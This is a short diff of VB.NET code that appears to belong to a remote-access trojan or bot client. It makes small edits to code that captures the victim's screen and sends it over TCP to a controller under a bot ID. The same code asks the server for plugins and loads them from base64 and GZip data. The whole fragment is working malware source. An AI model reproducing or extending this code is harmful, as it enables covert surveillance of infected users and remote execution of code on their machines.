@@ -34,6 +34,7 @@
                             THU.Save(MM, System.Drawing.Imaging.ImageFormat.Jpeg)
                             C_TcpClient.Send("#CAP" & SPL & C_ID.Bot & SPL & Text.Encoding.Default.GetString(MM.ToArray))
                             Try
+                                _g.Dispose()
                                 MM.Dispose()
                                 THU.Dispose()
                                 G.Dispose()
@@ -44,9 +45,10 @@
 
                     Case "CPL" 'check if plugin in installed, or ask server to send it
                         If GTV(A(1)) = Nothing Then
-                            Console.WriteLine(A(1))
+                            Diagnostics.Debug.WriteLine(A(1))
                             C_TcpClient.Send("GPL" + SPL + A(1))
                         Else
+                            Diagnostics.Debug.WriteLine("Invoked")
                             Plugin(GZip(Convert.FromBase64String(GTV(A(1))), False))
                         End If
 
